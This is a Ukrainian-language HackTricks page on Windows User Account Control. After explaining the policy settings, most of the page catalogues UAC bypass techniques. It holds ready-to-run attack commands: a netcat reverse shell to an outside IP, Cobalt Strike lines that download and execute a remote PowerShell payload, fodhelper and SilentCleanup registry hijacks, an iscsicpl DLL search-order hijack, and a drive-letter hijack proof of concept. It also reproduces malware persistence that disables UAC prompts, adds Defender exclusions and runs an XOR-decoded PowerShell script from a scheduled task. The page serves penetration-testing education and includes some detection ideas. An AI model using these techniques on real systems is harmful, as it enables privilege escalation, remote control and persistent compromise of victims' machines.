# UAC - Контроль облікових записів користувачів

{{#include ../../banners/hacktricks-training.md}}

## UAC

[Контроль облікових записів користувачів (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) — це функція, яка забезпечує **запит на підтвердження для дій із підвищенням привілеїв**. Програми мають різні рівні `integrity`, а програма з **високим рівнем** може виконувати завдання, які **потенційно можуть скомпрометувати систему**. Коли UAC увімкнено, програми та завдання завжди **запускаються в контексті безпеки облікового запису неадміністратора**, якщо адміністратор явно не дозволить цим програмам/завданням отримати доступ до системи на рівні адміністратора. Це зручна функція, яка захищає адміністраторів від ненавмисних змін, але вона не вважається межею безпеки.<sup>[[2]](#references)</sup>

Докладніше про рівні integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Коли UAC активний, користувач-адміністратор отримує 2 токени: токен стандартного користувача для виконання звичайних дій із середнім рівнем integrity та токен із привілеями адміністратора.

На цій [сторінці](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) детально описано принцип роботи UAC, зокрема процес входу, взаємодію з користувачем і архітектуру UAC.<sup>[[2]](#references)</sup> Адміністратори можуть використовувати політики безпеки для налаштування роботи UAC відповідно до потреб своєї організації на локальному рівні (за допомогою secpol.msc) або налаштувати їх і розгорнути через об’єкти групової політики (GPO) у середовищі домену Active Directory. Різні налаштування докладно описано [тут](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Для UAC можна налаштувати 10 параметрів групової політики. У наведеній нижче таблиці наведено додаткові відомості:

| Параметр групової політики                                                                                                                                                                                                                                                                                                                                                           | Розділ реєстру                | Значення за замовчуванням                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Контроль облікових записів користувачів: режим схвалення адміністратором для вбудованого облікового запису адміністратора](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Вимкнено)                                             |
| [Контроль облікових записів користувачів: поведінка запиту на підвищення привілеїв для адміністраторів у режимі схвалення адміністратором](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Запитувати підтвердження для бінарних файлів, що не належать Windows, на захищеному робочому столі) |
| [Контроль облікових записів користувачів: поведінка запиту на підвищення привілеїв для стандартних користувачів](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Запитувати облікові дані на захищеному робочому столі)         |
| [Контроль облікових записів користувачів: виявляти інсталяції програм і запитувати підвищення привілеїв](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Увімкнено; за замовчуванням вимкнено у версії Enterprise)           |
| [Контроль облікових записів користувачів: підвищувати привілеї лише для підписаних і перевірених виконуваних файлів](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Вимкнено)                                             |
| [Контроль облікових записів користувачів: підвищувати привілеї лише для програм UIAccess, інстальованих у захищених розташуваннях](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Увімкнено)                                              |
| [Контроль облікових записів користувачів: запускати всіх адміністраторів у режимі схвалення адміністратором](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Увімкнено)                                              |
| [Контроль облікових записів користувачів: дозволяти програмам UIAccess запитувати підвищення привілеїв без використання захищеного робочого столу](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Вимкнено)                                             |
| [Контроль облікових записів користувачів: перемикатися на захищений робочий стіл під час запиту підвищення привілеїв](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Увімкнено)                                              |
| [Контроль облікових записів користувачів: віртуалізувати помилки запису файлів і реєстру в розташування для окремих користувачів](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Увімкнено)                                              |

### Політики інсталяції програмного забезпечення у Windows

**локальні політики безпеки** ("secpol.msc" у більшості систем) за замовчуванням налаштовані так, щоб **забороняти користувачам без прав адміністратора виконувати інсталяцію програмного забезпечення**. Це означає, що навіть якщо користувач без прав адміністратора може завантажити інсталятор вашого програмного забезпечення, він не зможе запустити його без облікового запису адміністратора.

### Розділи реєстру для примусового запиту підвищення привілеїв UAC

Як стандартний користувач без прав адміністратора ви можете переконатися, що для **стандартного** облікового запису UAC **запитуватиме облікові дані**, коли він намагається виконати певні дії. Для цього потрібно змінити певні **розділи реєстру**, для чого необхідні права адміністратора, якщо немає **UAC bypass** або зловмисник уже ввійшов до системи як адміністратор.

Навіть якщо користувач входить до групи **Administrators**, ці зміни змушують користувача **повторно ввести облікові дані свого облікового запису**, щоб виконати адміністративні дії.

**На практиці це корисно лише тоді, коли у вас уже є токен із підвищеними привілеями, UAC bypass або неправильна конфігурація, яка дає змогу змінювати ці ключі; в іншому разі сам запис до реєстру буде заблоковано.**

Розділи реєстру та записи, які потрібно змінити, наведено нижче (значення за замовчуванням указано в дужках):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Це також можна зробити вручну за допомогою інструмента Local Security Policy. Після внесення змін під час адміністративних операцій користувачеві буде запропоновано повторно ввести свої облікові дані.

### Примітка

**Контроль облікових записів користувачів не є межею безпеки.** Тому стандартні користувачі не можуть вийти за межі своїх облікових записів і отримати права адміністратора без експлойту локального підвищення привілеїв.

### Запросити в користувача «повний доступ до комп’ютера»
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Привілеї UAC

- Protected Mode Internet Explorer використовує перевірки цілісності, щоб запобігти доступу процесів із високим рівнем цілісності (наприклад, веббраузерів) до даних із низьким рівнем цілісності (наприклад, до папки тимчасових файлів Internet). Для цього браузер запускається з токеном низького рівня цілісності. Коли браузер намагається отримати доступ до даних, що зберігаються в зоні низького рівня цілісності, операційна система перевіряє рівень цілісності процесу та відповідно дозволяє доступ. Ця функція допомагає запобігати атакам віддаленого виконання коду, які намагаються отримати доступ до конфіденційних даних у системі.
- Коли користувач входить до Windows, система створює токен доступу, що містить список привілеїв користувача. Привілеї визначаються як сукупність прав і можливостей користувача. Токен також містить список облікових даних користувача — даних, які використовуються для автентифікації користувача на комп’ютері та доступу до ресурсів у мережі.

### Autoadminlogon

Щоб налаштувати автоматичний вхід до Windows певного користувача під час запуску системи, установіть **`AutoAdminLogon` registry key**. Це корисно для kiosk-середовищ або з метою тестування. Використовуйте цю функцію лише в захищених системах, оскільки вона відкриває пароль у реєстрі.

Установіть такі keys за допомогою Registry Editor або `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Щоб повернути стандартну поведінку входу, установіть `AutoAdminLogon` у значення 0.

## UAC bypass

> [!TIP]
> Зверніть увагу: якщо ви маєте графічний доступ до жертви, UAC bypass є простим, оскільки можна просто натиснути «Yes», коли з’явиться запит UAC.

UAC bypass потрібен у такій ситуації: **UAC активовано, ваш процес працює в контексті середнього рівня цілісності, а ваш користувач належить до групи адміністраторів**.

Важливо зазначити, що **обійти UAC набагато складніше, якщо він працює на найвищому рівні безпеки (Always), ніж на будь-якому іншому рівні (Default).**

### Швидка triage-перевірка з shell середнього рівня цілісності

Перш ніж намагатися виконати bypass, переконайтеся, що ви перебуваєте в потрібному сценарії, і визначте build хоста для зіставлення з відомими робочими методами:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Практичні примітки:
- Якщо `EnableLUA=0`, bypass не потрібен: будь-який токен адміністратора може безпосередньо запросити high integrity.
- `ConsentPromptBehaviorAdmin=2` або `5` — поширений сценарій для auto-elevate / COM-based bypasses.
- `Always Notify` підвищує вимоги, але все одно слід протестувати точну збірку, а не припускати невдачу: UACME досі відстежує деякі методи, сумісні з `AlwaysNotify`, у сучасних збірках Windows.<sup>[[3]](#references)</sup>

### UAC вимкнено

Якщо UAC уже вимкнено (`ConsentPromptBehaviorAdmin` дорівнює **`0`**), можна **виконати reverse shell з привілеями адміністратора** (рівень high integrity), використовуючи щось на кшталт:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Дуже** базовий UAC "обхід" (повний доступ до файлової системи)

Якщо у вас є shell із користувачем, який входить до групи Administrators, ви можете **підключити спільний ресурс C$** через SMB (файлову систему) локально як новий диск і отримаєте **доступ до всього в файловій системі** (навіть до домашньої папки Administrator).

> [!WARNING]
> **Схоже, цей трюк більше не працює**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

The Cobalt Strike techniques will only work if UAC is not set at its max security level
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** і **Metasploit** також мають кілька модулів для **bypass** **UAC**.

### Підвищені COM-інтерфейси (`ICMLuaUtil` / `CMSTPLUA`)

Автоматично підвищені COM-об'єкти залишаються практичною поверхнею UAC у сучасних збірках. `ICMLuaUtil` досі позначений у UACME як такий, що працює в актуальних гілках Windows, а offensive tooling продовжує адаптувати `CMSTPLUA`, поєднуючи інтерактивний процес робочого столу, 64-бітне виконання та іноді masquerading PEB/процесу перед викликом COM Elevation Moniker.<sup>[[3]](#references)</sup>

Практичні поради:
- Надавайте перевагу **64-бітному** процесу в **інтерактивному сеансі** користувача (зазвичай `explorer.exe` або його дочірньому процесу).
- Якщо raw shell не працює, повторіть спробу з реалізації BOF / UACME замість наївної обгортки `CreateProcess`.
- Очікуйте, що дочірнє виконання відбуватиметься в **окремому підвищеному процесі**; багато BOF не підвищують поточний beacon на місці.

### KRBUACBypass

Документація та інструмент доступні за адресою [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Експлойти для UAC bypass

[**UACME**](https://github.com/hfiref0x/UACME) — це набір технік для UAC bypass. Скомпілюйте його за допомогою Visual Studio або MSBuild; збірка створює кілька виконуваних файлів (наприклад, `Source\Akagi\output\x64\Debug\Akagi.exe`), тому виберіть метод, що відповідає цільовій збірці.<sup>[[3]](#references)</sup>\
Будьте обережні: деякі bypass запускають видимі програми або вікна запитів, які можуть привернути увагу користувача.<sup>[[3]](#references)</sup>

UACME містить **номер збірки, починаючи з якої кожна техніка почала працювати**.<sup>[[3]](#references)</sup> Ви можете знайти техніку, яка впливає на ваші версії:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Також за допомогою [цієї](https://en.wikipedia.org/wiki/Windows_10_version_history) сторінки можна визначити Windows release `1607` за версіями build.

Практичний робочий процес полягає в тому, щоб спочатку **оцінити build хоста**, а вже потім запустити відповідний метод:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` швидко порівнює локальну збірку з відомими методами UAC, що дає змогу швидко відкидати непрацюючі PoC.<sup>[[4]](#references)</sup>
- `UACME` залишається найкращим загальнодоступним каталогом для зіставлення bypass із конкретною збіркою. В останніх релізах додано нові методи та повторно протестовано наявні проти **Windows 11 25H2**, тому перевірте README/примітки до релізу, перш ніж вважати, що старий допис у блозі досі застосовний без змін.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Довірений бінарний файл `fodhelper.exe` у сучасних версіях Windows автоматично підвищує привілеї. Під час запуску він запитує наведений нижче per-user шлях у реєстрі, не перевіряючи verb `DelegateExecute`. Розміщення там команди дає змогу процесу з Medium Integrity (користувач входить до групи Administrators) запустити процес із High Integrity без запиту UAC.

Шлях у реєстрі, який запитує fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Кроки PowerShell (налаштуйте свій payload, потім запустіть)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Примітки:
- Працює, коли поточний користувач є членом групи Administrators, а рівень UAC має значення за замовчуванням/поблажливий (не Always Notify із додатковими обмеженнями).
- Використовуйте шлях `sysnative`, щоб запустити 64-бітний PowerShell із 32-бітного процесу в 64-бітній Windows.
- Payload може бути будь-якою командою (PowerShell, cmd або шляхом до EXE). Для прихованості не допускайте появи інтерфейсів запитів.

#### Варіант hijack CurVer/extension (лише HKCU)

У новіших зразках, які зловживають `fodhelper.exe`, уникають `DelegateExecute` і натомість **перенаправляють ProgID `ms-settings`** через значення `CurVer` для поточного користувача. Auto-elevated binary і надалі знаходить обробник у `HKCU`, тому для розміщення ключів не потрібен admin token:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Після підвищення привілеїв malware зазвичай **вимикає майбутні запити** шляхом встановлення `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` у значення `0`, а потім виконує додаткове defense evasion (наприклад, `Add-MpPreference -ExclusionPath C:\ProgramData`) і повторно створює persistence для запуску з високим рівнем цілісності. Типове завдання persistence зберігає **XOR-зашифрований PowerShell-скрипт** на диску та щогодини декодує й виконує його в пам’яті:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Цей варіант також очищає dropper і залишає лише staged payloads, тому виявлення залежить від моніторингу **`CurVer` hijack**, втручання в `ConsentPromptBehaviorAdmin`, створення виключення Defender або запланованих завдань, які розшифровують PowerShell у пам’яті.<sup>[[5]](#references)</sup>

### Обхід UAC через завдання `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` запускає `cleanmgr.exe` з найвищими привілеями та розгортає `%windir%` із середовища користувача. Якщо ви контролюєте `HKCU\Environment\windir`, можна перенаправити це розгортання на довільну команду й отримати високий рівень цілісності без діалогового вікна підтвердження.<sup>[[8]](#references)</sup> Цей метод усе ще варто тестувати на новіших збірках, оскільки UACME продовжує підтримувати техніку, а відстеження останніх проблем показує, що для Windows 11 24H2 можуть знадобитися лише незначні зміни quoting.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Якщо завдання цитує шлях у цій збірці, повторіть спробу з payload, що закінчується лапкою (наприклад, `cmd.exe"`). Після тестування завжди очищайте `HKCU\Environment\windir`.

#### Додаткові UAC bypass

Багато класичних UAC bypass, які зловживають UI-потоками, COM-об’єктами або взаємодією з desktop, потребують **повної інтерактивної сесії** з жертвою; звичайного shell через `nc.exe` або service, що працює в **Session 0**, часто недостатньо.

Часто це можна вирішити за допомогою сесії **meterpreter**. Виконайте міграцію до **process**, у якого значення **Session** дорівнює **1**:

![Спрямуйте ms-settings на custom extension (.thm) і зіставте це розширення з нашим payload - Додаткові UAC bypass: Це можна зробити за допомогою сесії meterpreter. Виконайте міграцію до process, у якого значення Session...](<../../images/image (863).png>)

(_explorer.exe_ має працювати)

### UAC Bypass через GUI

Якщо ви маєте доступ до **GUI**, ви можете просто прийняти запит UAC, коли він з’явиться; технічний bypass насправді не потрібен. Тому отримання GUI-сесії часто достатнє, щоб обійти практичні незручності, які додає UAC.

Крім того, якщо ви отримали GUI-сесію, якою хтось користувався (потенційно через RDP), там можуть працювати **деякі tools від імені адміністратора**, з яких можна **запустити**, наприклад, **cmd** безпосередньо **з правами адміністратора**, і UAC більше не запитуватиме підтвердження, як у [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Це може бути дещо більш **stealthy**.

### Гучний brute-force UAC bypass

Якщо шум допустимий, tool на кшталт [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) може повторно запитувати підвищення привілеїв, доки користувач його не прийме.

### Власний bypass - базова методологія UAC bypass

Якщо переглянути **UACME**, можна помітити, що **багато UAC bypass зловживають DLL hijacking** (часто змушуючи elevated binary завантажити DLL, контрольовану attacker, з доступного для запису шляху). [Прочитайте це, щоб дізнатися, як знаходити вразливість DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Знайдіть binary, який виконує **autoelevate** (перевірте, що під час виконання він запускається на рівні високої цілісності).
2. За допомогою procmon знайдіть події "**NAME NOT FOUND**", які можуть бути вразливими до **DLL Hijacking**.
3. Імовірно, вам потрібно буде **записати** DLL у деякі **захищені шляхи** (наприклад, C:\Windows\System32), до яких у вас немає дозволу на запис. Це можна обійти за допомогою:
1. **wusa.exe**: Windows 7,8 і 8.1. Він дає змогу видобути вміст CAB-файлу в захищені шляхи (оскільки цей tool запускається на рівні високої цілісності).
2. **IFileOperation**: Windows 10.
4. Підготуйте **script**, який скопіює вашу DLL у захищений шлях і запустить вразливий binary з autoelevate.

### Інша техніка UAC bypass

Вона полягає в перевірці, чи намагається **autoElevated binary** прочитати з **registry** **ім’я/шлях** **binary** або **command**, який потрібно **виконати** (це цікавіше, якщо binary шукає цю інформацію в **HKCU**).

### UAC bypass через `SysWOW64\iscsicpl.exe` + DLL hijack у user `PATH`

32-бітний `C:\Windows\SysWOW64\iscsicpl.exe` — це **auto-elevated** binary, яким можна зловживати для завантаження `iscsiexe.dll` відповідно до порядку пошуку. Якщо ви можете розмістити шкідливий `iscsiexe.dll` у **доступній для запису користувачем** теці, а потім змінити `PATH` поточного користувача (наприклад, через `HKCU\Environment\Path`), щоб ця тека шукалася, Windows може завантажити DLL attacker у процес elevated `iscsicpl.exe` **без відображення запиту UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Практичні примітки:
- Це корисно, коли поточний користувач входить до групи **Administrators**, але працює на рівні **Medium Integrity** через UAC.
- Копія в **SysWOW64** є релевантною для цього bypass. Розглядайте копію в **System32** як окремий binary і перевіряйте її поведінку незалежно.
- Примітив є поєднанням **auto-elevation** і **DLL search-order hijacking**, тому той самий workflow у ProcMon, який використовується для інших UAC bypass, допоможе перевірити завантаження відсутньої DLL.

Мінімальний flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ідеї для виявлення:
- Створюйте сповіщення про `reg add` / записи до реєстру в `HKCU\Environment\Path`, за якими одразу виконується `C:\Windows\SysWOW64\iscsicpl.exe`.
- Шукайте `iscsiexe.dll` у **контрольованих користувачем** розташуваннях, таких як `%TEMP%` або `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Встановлюйте кореляцію між запусками `iscsicpl.exe` і неочікуваними дочірніми процесами або завантаженнями DLL із каталогів поза стандартними каталогами Windows.

### Новіші дослідження, які варто перевірити окремо

Деякі ланцюжки після 2024 року більше не мають вигляду класичних hijack-атак на реєстр `HKCU\Software\Classes`. Наприклад, poisoning кешу activation context може поєднувати **перепризначення диска** та **перенаправлення DLL**, щоб перейти від середньої до високої цілісності через trusted UI / auto-elevated binaries, такі як `ctfmon.exe`, а згодом і новіші цілі, як-от `fodhelper.exe`. Замість дублювання великого PoC тут перегляньте компактні приклади payload у:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Hijack літери диска в Administrator Protection (25H2) через DOS device map для кожної logon-сесії

Щоб ознайомитися з повною поверхнею атаки `RAiLaunchAdminProcess` / UIAccess у Windows 11 25H2, перегляньте окрему сторінку:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” використовує shadow-admin tokens із картами `\Sessions\0\DosDevices/<LUID>` для кожної сесії. Каталог ліниво створюється `SeGetTokenDeviceMap` під час першого розв’язання `\??`. Якщо attacker impersonates shadow-admin token лише на рівні **SecurityIdentification**, каталог створюється з attacker як **owner** (успадковує `CREATOR OWNER`), що дає змогу створювати посилання на літери дисків, які мають пріоритет над `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Кроки:**

1. Із сесії з низькими привілеями викличте `RAiProcessRunOnce`, щоб запустити shadow-admin `runonce.exe` без prompt.
2. Дублюйте його primary token у **identification** token і impersonate його під час відкриття `\??`, щоб примусово створити `\Sessions\0\DosDevices/<LUID>` із правами власника attacker.
3. Створіть там symlink `C:`, що вказує на storage під контролем attacker; подальші доступи до файлової системи в цій сесії розв’язуватимуть `C:` у шлях attacker, уможливлюючи DLL/file hijack без prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Як працює User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Колекція технік обходу UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Сканер сумісності та launcher для обходу UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI використовує AI для генерації PowerShell backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Операція TrueChaos: експлуатація 0-Day проти урядових цілей у Південно-Східній Азії](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Обхід захисту адміністраторів Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Обхід UAC за допомогою завдання SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
{{#include ../../banners/hacktricks-training.md}}
